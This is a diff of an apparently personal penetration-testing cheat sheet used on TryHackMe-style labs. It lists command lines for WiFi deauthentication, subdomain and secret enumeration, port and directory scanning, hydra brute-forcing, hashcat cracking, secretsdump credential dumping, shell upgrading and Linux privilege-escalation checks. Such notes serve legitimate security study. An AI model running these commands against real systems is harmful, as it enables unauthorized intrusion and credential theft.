@@ -1,5 +1,5 @@
 USEFUL_LINKS:
-        https://github.com/swisskyrepo/PayloadsAllTheThings
+	https://github.com/swisskyrepo/PayloadsAllTheThings
 WIFI:
         --band a
         sudo airmon-ng check kill
@@ -9,24 +9,25 @@ WIFI:
         sudo aireplay-ng -0 0 -a [MAC_РОУТЕРА] wlan0mon
         sudo aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30
 TOOLS:
-        subfinder -d someweb.com -o subf.txt -v
-        assetfinder -subs-only someweb.com > asset.txt
-        //amass
-        cat subf.txt asset.txt | sort -u > subdomains.txt
-        cat subdomains.txt | ~/go/bin/httpx -o live_domains.txt -threads 200 -status-code -follow-redirects
-        katana -list live_domains.txt -kf -td -o urls.txt
-        //gau
-        cat urls.txt | uro -o clean_urls.txt
-        cat clean_urls.txt | ~/go/bin/httpx -silent -fc 404 -srd ./content
-        cat clean_urls.txt | ~/go/bin/mantra
-        trufflehog filesystem ./folder
-        trufflehog git https://github.com/repo
-        cat */*.js | trufflehog stdin
+	amass enum -active -config ~/.config/amass/config.yaml | tee -a amass_results.txt
+	subfinder -d someweb.com -o subf.txt -v
+	assetfinder -subs-only someweb.com > asset.txt
+	amass enum -d "$target" -passive
+	cat subf.txt asset.txt | sort -u > subdomains.txt
+	cat subdomains.txt | ~/go/bin/httpx -o live_domains.txt -threads 200 -status-code -follow-redirects
+	katana -list live_domains.txt -kf -td -o urls.txt
+	//gau
+	cat urls.txt | uro -o clean_urls.txt
+	cat clean_urls.txt | ~/go/bin/httpx -silent -fc 404 -srd ./content
+	cat clean_urls.txt | ~/go/bin/mantra
+	trufflehog filesystem ./folder
+	trufflehog git https://github.com/repo
+	cat */*.js | trufflehog stdin
         nmap -sS --open -sV -Pn -T4 -vvv 10.82.130.53
         ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc all -c -v -u http://10.81.180.85/FUZZ 
-        feroxbuster -u https://target.com -w /usr/share/SecLists/
+	feroxbuster -u https://target.com -w /usr/share/SecLists/
         hydra -L userlist -P passlist protocol://address -vvv  
-        ffuf -request request.txt -request-proto http -w wordlist.txt:FUZZ -fr "ErrorCode=1" -c -v
+	ffuf -request request.txt -request-proto http -w wordlist.txt:FUZZ -fr "ErrorCode=1" -c -v
         katana -u https://10.81.185.232 -j | grep "THM"
         binwalk -e filename
         hashcat -m <hash type> <file storing your hash> <path to wordlist>
@@ -43,10 +44,10 @@ TOOLS:
         showmount -e 10.80.140.153
         rdesktop -u username -p password IP
         python3 secretsdump.py -sam sam.save -system system.save LOCAL
-        python3 ~/awesome_things/scripts/knockit.py -b <IP> 1111 2222 3333 4444
-        python3 ~/awesome_things/scripts/XSStrike/xsstrike.py  -r request.txt
-        python3 ~/awesome_things/scripts/SSTImap/sstimap.py -u http://admin.cyprusbank.thm/settings -m POST -d 'name=asd&password=asd' -p password 
-        python3 ~/awesome_things/scripts/secret_finder.py -i "folder/*.txt" -o output.html
+	python3 ~/awesome_things/scripts/knockit.py -b <IP> 1111 2222 3333 4444
+	python3 ~/awesome_things/scripts/XSStrike/xsstrike.py  -r request.txt
+	python3 ~/awesome_things/scripts/SSTImap/sstimap.py -u http://admin.cyprusbank.thm/settings -m POST -d 'name=asd&password=asd' -p password 
+	python3 ~/awesome_things/scripts/secret_finder.py -i "folder/*.txt" -o output.html
         crackmapexec smb 10.80.167.149 -u 'a' -p '' --shares 
         smbclient //10.82.130.53/share
 
@@ -59,12 +60,12 @@ REVERSE SHELL:
 REVERSE SHELL UPGRADE:
         python3 -c 'import pty; pty.spawn("/bin/bash")'
         export SHELL=bash; export TERM=xterm-256color; bash -i
-        stty raw -echo; fg
+	stty raw -echo; fg
 
 PRIVILEGE ESCALATION:
         id
         cat /etc/crontab
-        /etc/cron.d/
+	/etc/cron.d/
         find / -perm -4000 2>/dev/null
         sudo -l
         (env || set) 2>/dev/null
@@ -72,8 +73,8 @@ PRIVILEGE ESCALATION:
         find / -type f -group lachlan 2>/dev/null
         ps aux
         systemctl | grep running
-        service --status-all | grep '+'
-        grep -ir "password"
+	service --status-all | grep '+'
+	grep -ir "password"
         Get-WmiObject -Class Win32_Product
 
 OTHER:
